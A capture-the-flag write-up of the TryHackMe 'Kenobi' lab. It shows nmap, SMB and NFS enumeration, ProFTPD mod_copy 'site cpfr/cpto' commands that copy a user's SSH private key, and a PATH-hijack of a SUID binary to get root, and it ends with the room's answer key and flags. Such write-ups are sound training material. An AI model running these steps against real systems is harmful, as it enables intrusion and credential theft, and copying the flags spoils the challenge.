# Writeup for the Try_Hack_Me box - [Kenobi](https://tryhackme.com/room/kenobi). 

The box utilizes **Samba share** for enumeration and get on the box. Priv Esc is through a SUID binary on an unknown binary.
 
> Pratyush Prakhar (5#1NC#4N) - 08/11/2023

## RECON

1. Scan the machine with nmap, how many ports are open? - **7**

**Output**

```bash
Nmap scan report for 10.10.224.128
Host is up, received syn-ack (0.21s latency).
Scanned at 2023-08-11 22:10:42 EDT for 46s
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE        REASON  VERSION
21/tcp   open  ftp            syn-ack ProFTPD 1.3.5
22/tcp   open  ssh            syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp   open  http           syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp  open  rpcbind        syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100021  1,3,4      39825/tcp6  nlockmgr
|_  100021  1,3,4      45183/udp6  nlockmgr
139/tcp  open  netbios-ssn    syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  Eetbios-`J���U syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs            syn-ack 2-4 (RPC #100003)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-08-11T21:11:19-05:00
| smb2-time: 
|   date: 2023-08-12T02:11:19
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 5773/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 16377/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 34133/udp): CLEAN (Failed to receive data)
|   Check 4 (port 14622/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

2. Services found open:
   1. *Port 21* - FTP - **ProFTPD 1.3.5**
   2. *Port 22* - SSH - **OpenSSH 7.2p2**
   3. *Port 80* - HTTP - **Apache httpd 2.4.18**
   4. *Port 139,445* - Samba - **Samba smbd 4.3.11**
   5. *Port 111,2049* - RPCbind, NFS

3. Let's try to actively enumerate the path to gain more information.

## FTP

1. FTP is a basic file transfer protocol which allows to host a part of file system for access. 
2. For access, one might need `credentials` for acess. This provides a part for `fuzzing attacks` but might be caught by access logging mechanisms ont he system. Thus, a risk to follow this attack path. 
3. In this case, we have the `ProFTPD 1.3.5` which has password protection.
4. Let's look into any exploit that might be possible using `searchsploit` 
   1. Both `mod_copy` exploit fail due to non-writable paths.
   2. But the [text file]() here explains that we can use `CPFR` and `CPTO` commands on this version to copy file around the system. This can be exploited if we have some access to the file system to read or view and better execute.
 5. Let's move on to next options. We can use it once we have some credentials or the second path.

**Output**

```bash
$ ftp 10.10.224.128   
Connected to 10.10.224.128.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.224.128]
Name (10.10.224.128:kali): kali
331 Password required for kali
Password: 
530 Login incorrect.
ftp: Login failed
ftp> ls
530 Please login with USER and PASS
530 Please login with USER and PASS
```

```bash
$ searchsploit proftpd 1.3.5
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                    
```


## SMB

1. Samba is installed on the system which is a file system protocol. This is for Windows what FTP is for linux with additional features.
2. Let's explore the SMB shares that might be available to us.
3. Let enumerate the shares using smbmap. We can also use tools like`enum4linux` or `nmap scripts`. 

**Output**

```bash
$ smbmap -H 10.10.78.112
[+] Guest session       IP: 10.10.78.112:445    Name: 10.10.78.112                                      
        Disk                                                    Permissions    Comment
        ----                                                    -----------    -------
        print$                                                  NO ACCESS      Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS      IPC Service (kenobi server (Samba, Ubuntu))
```

4. Let's try to connect to the `anonymous` share as it is open to read by all. We can use `smbclient` for this.
 
**Output**

```bash
$ smbclient \\\\10.10.78.112\\anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877100 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (14.2 KiloBytes/sec) (average 14.2 KiloBytes/sec)
smb: \> cd ..
smb: \> l
s  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877100 blocks available
```
5. We get `log.txt` file from share which can be useful to get some sensitive information. Information disclosed
   1. Information about the SSH key generation.
   2. ProFTPD default config file.
6. But there is no direct path to get foothold. Let's move to the next path.


## NFS

1. This is a file system protocol open on port 111. This allows a client ot mount a portion of the server file system on the local machine and interact with it in the given permissions set.

2. Let's check for any mountable directories open on our server using `showmount`. We can the use the mountable directory to our local system using `mount` and the exports. Found a very simple process to follow here in this [blog](https://resources.infosecinstitute.com/topics/penetration-testing/exploiting-nfs-share/)

**Output**

```bash
$ showmount --exports 10.10.252.139
Export list for 10.10.252.139:
/var *
                                                                                 
$ mkdir var           
                                                                                 
$ sudo mount -t nfs 
                                                                                 
$ sudo mount -t nfs 10.10.252.139:/var ./var 
[sudo] password for kali: 
                                                                                 
$ ls -la ./var 
total 56
drwxr-xr-x 14 root root  4096 Sep  4  2019 .
drwxr-xr-x  3 kali kali  4096 Aug 13 19:00 ..
drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
drwxrwxr-x 10 root _ssh  4096 Sep  4  2019 log
drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
drwxrwxrwt  6 root root  4096 Aug 13 18:40 tmp
drwxr-xr-x  3 root root  4096 Sep  4  2019 www
```

3. We find that the `/var` dir of the server is mountable and we can read file from the system. 

4. And now we have a path inside by combining the copy files exploit [here]() and the read here through var directory. 


## INITIAL ACCESS

1. Let's use the FTP exploit to get read on the common files.
   1. We found that there are only two users with login on the system - `root` & `kenobi`. 
   2. Let's try to find common files in `/home/kenobi` and try to obtain ssh keys.

**Output**

```bash
$ ftp 10.10.252.139
Connected to 10.10.252.139.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.252.139]
Name (10.10.252.139:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
530 Login incorrect.
ftp: Login failed
ftp> site cpfr /etc/passwd
350 File or directory exists, ready for destination name
ftp> site cpto /var/tmp/passwd
250 Copy successful                                                              
ftp> site cpfr /home/kenobi/user.txt
350 File or directory exists, ready for destination name
ftp> site cpto /var/tmp/user.txt
250 Copy successful
ftp> site cpfr /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
ftp> site cpto /var/tmp/kenobi_id_rsa
250 Copy successful
ftp> 
zsh: suspended  ftp 10.10.252.139
```

```bash
$ cat passwd | grep bash
root:x:0:0:root:/root:/bin/bash
kenobi:x:1000:1000:kenobi,,,:/home/kenobi:/bin/bash
                                                                                 
$ chmod 600 kenobi_id_rsa
                                                                                 
$ ssh -i kenobi_id_rsa kenobi@10.10.252.139 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Sun Aug 13 17:42:38 2023 from 10.13.5.5
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

2. We can now use SSH to get on the system with the kenobi's SSH private key.


## SSH

1. The system has OpenSSH installed which requires login by a valid user on the allowlist.,
2. We can fuzz with tools like `hydra` and `wfuzz` but is a high resistance task. 
3. We can get foothold with a set of valid credentials or SSH key. Getting on the system using kenobi's private key.


## PRIVESC

1. We get on the system and run the `linpeas.sh` script to get all the useful information on the system.
2. We find that there is a `SUID` privesc set on an unknown binary as `/usr/bin/menu` which has permission set as `root`.


**Output**

```bash
..............................................

-rw-r--r-- 1 root root 655 May 16  2017 /etc/skel/.profile
-rw-r--r-- 1 kenobi kenobi 655 Sep  4  2019 /home/kenobi/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                           
                      ╚════════════════════════════════════╝                                                                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                             
strace Not Found                                                                                                                                                                             
-rwsr-xr-x 1 root root 93K May  8  2019 /sbin/mount.nfs                                                                                                                                      
-rwsr-xr-x 1 root root 15K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 97K Jan 29  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 39K Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 23K Jan 15  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 8.7K Sep  4  2019 /usr/bin/menu (Unknown SUID binary!)
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 27K May 16  2018 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40K May 16  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
...............................................................
```

3. Digging through the menu binary, one can find that for each options there are several default binaries run. We can exploit the `PATH` variable to inject malicious binaries to run them as part of the script. In this case, I am going with `curl` command. You can use the other two as well.

```bash
kenobi@kenobi:/usr/bin$ ./menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
HTTP/1.1 200 OK
Date: Sun, 13 Aug 2023 23:38:46 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
ETag: "c8-591b6884b6ed2"
Accept-Ranges: bytes
Content-Length: 200
Vary: Accept-Encoding
Content-Type: text/html

kenobi@kenobi:/usr/bin$ strings menu 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
__isoc99_scanf
puts
__stack_chk_fail
printf
system
__libc_start_main
__gmon_start__
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
UH-`
AWAVA
AUATL
[]A\A]A^A_
***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig
 Invalid choice
```

4. We can use the following explaination to replace the curl binary in the menu with `bash` binary and run it with permissions of the root when invoked.

```bash
kenobi@kenobi:/tmp$ echo "/bin/bash" > curl 
kenobi@kenobi:/tmp$ cat curl 
/bin/bash
kenobi@kenobi:/tmp$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:/tmp$ /usr/bin/menu 

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# whoami
root
root@kenobi:/tmp# cat /root/root.txt
*********************************************** 
```

5. The box is pawned!! We can use this to get full hold of the system.
   1. Got the [shadow file]() and can be used to crack passwords with `john` with [hashes]() file.


## Answers to complete the box

1. NMAP
   1. Scan the machine with nmap, how many ports are open? - **7**

2. SMB
   1. how many shares have been found? - **3**
   2. Once you're connected, list the files on the share. What is the file can you see? - **log.txt**

3. FTP
   1. What port is FTP running on? - **21**
   2. What is the version of ProFTPD? - **1.3.5**
   3. How many exploits are there for the ProFTPd running? - **4**

4. NFS
   1. What mount can we see? - **/var**

5. PrivEsc
   1. What file looks particularly out of the ordinary? - **/usr/bin/menu**
   2. Run the binary, how many options appear? - **3**

6. Flags
   1. What is Kenobi's user flag (/home/kenobi/user.txt)? - **d0b0f3f53b6caa532a83915e19224899**
   2. What is the root flag (/root/root.txt)? - **177b3cd8562289f37382721c28381f02**


**Stay Tuned On**\
[Github](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)
